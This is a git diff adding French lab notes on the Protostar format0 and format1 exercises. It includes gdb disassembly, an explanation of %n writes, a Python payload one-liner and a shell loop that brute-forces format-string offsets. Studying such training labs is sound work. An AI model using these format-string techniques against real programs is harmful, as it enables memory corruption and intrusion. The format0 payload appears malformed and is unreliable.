@@ -429,3 +429,137 @@ On forge une suite d'octets arbitaire:
 > * `(0x50 - 28)` car il faut injecter 0x50 carcatères. Et le code du [shell](http://shell-storm.org/shellcode/files/shellcode-811.php) fait 28 octets.
 > * On fait une pierre deux coups. L'appel à `call EAX` est injecté via écrasement causé par un débordement de buffer `buffer` (`0x50` caractères).
 
+# Format0
+
+## Présentation
+
+[https://web.archive.org/web/20140405141145/http://exploit-exercises.com/protostar/format0](https://web.archive.org/web/20140405141145/http://exploit-exercises.com/protostar/format0)
+
+## Exploitation
+
+	(gdb) disassemble vuln
+	Dump of assembler code for function vuln:
+	0x080483f4 <vuln+0>:	push   ebp
+	0x080483f5 <vuln+1>:	mov    ebp,esp
+	0x080483f7 <vuln+3>:	sub    esp,0x68
+	0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
+	0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
+	0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
+	0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
+	0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
+	0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
+	0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
+	0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
+	0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
+	0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
+	0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
+	0x08048429 <vuln+53>:	leave  
+	0x0804842a <vuln+54>:	ret    
+	End of assembler dump.
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x0804842b <main+0>:	push   ebp
+	0x0804842c <main+1>:	mov    ebp,esp
+	0x0804842e <main+3>:	and    esp,0xfffffff0
+	0x08048431 <main+6>:	sub    esp,0x10
+	0x08048434 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
+	0x08048437 <main+12>:	add    eax,0x4
+	0x0804843a <main+15>:	mov    eax,DWORD PTR [eax]
+	0x0804843c <main+17>:	mov    DWORD PTR [esp],eax
+	0x0804843f <main+20>:	call   0x80483f4 <vuln>
+	0x08048444 <main+25>:	leave  
+	0x08048445 <main+26>:	ret    
+	End of assembler dump.
+
+Détermination de l'adresse relative de `buffer`:
+
+	0x080483f4 <vuln+0>:	push   ebp
+	0x080483f5 <vuln+1>:	mov    ebp,esp
+	0x080483f7 <vuln+3>:	sub    esp,0x68
+	0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
+	0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
+	0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
+	0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
+	0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
+	0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
+
+Réponse:
+
+	python -c 'print "0x64" + "\x0d\xad\xbe\xef"'
+
+# format1
+
+## Présentation
+
+[](https://web.archive.org/web/20140405143000/http://exploit-exercises.com/protostar/format1)
+
+## Exploitation
+
+Si:
+
+	int i;
+	printf("toto%n", &i);
+	// i vaut 4
+
+	printf("toto%2$n", &i, &j);
+	// j vaut 4
+
+Pile:
+
+	@retour de printf
+	format string
+	1er arg de la format string
+	2em arg de la format string
+	...
+
+Code:
+
+	(gdb) disassemble vuln
+	Dump of assembler code for function vuln:
+	0x080483f4 <vuln+0>:	push   ebp
+	0x080483f5 <vuln+1>:	mov    ebp,esp
+	0x080483f7 <vuln+3>:	sub    esp,0x18
+	0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
+	0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
+	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
+	0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
+	0x0804840a <vuln+22>:	test   eax,eax
+	0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
+	0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500
+	0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
+	0x0804841a <vuln+38>:	leave  
+	0x0804841b <vuln+39>:	ret    
+	End of assembler dump.
+
+Adresse de `string`:
+
+	0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
+	0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
+	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
+
+=> `ebp + 0x8`
+
+Adresse de `target`:
+
+	(gdb) print &target
+	$2 = (int *) 0x8049638
+
+> Il faut lancer le programme (`r`) avant.
+
+Pour trouver:
+
+	for i in `seq 500` ;
+	do
+	   ./format1 TOTO%$i\$08x`python -c "print '\x38\x96\x04\x08A'*4"` ;
+	   echo ' <-> ' $i ; 
+	done | grep 8049638
+
+
+
+
+
+# Good links
+
+* [https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YFC_DSXjKV4](https://louisrli.github.io/blog/2012/08/29/protostar-format0/#.YFC_DSXjKV4)
+* [https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/10-Format2.md](https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/10-Format2.md)
+
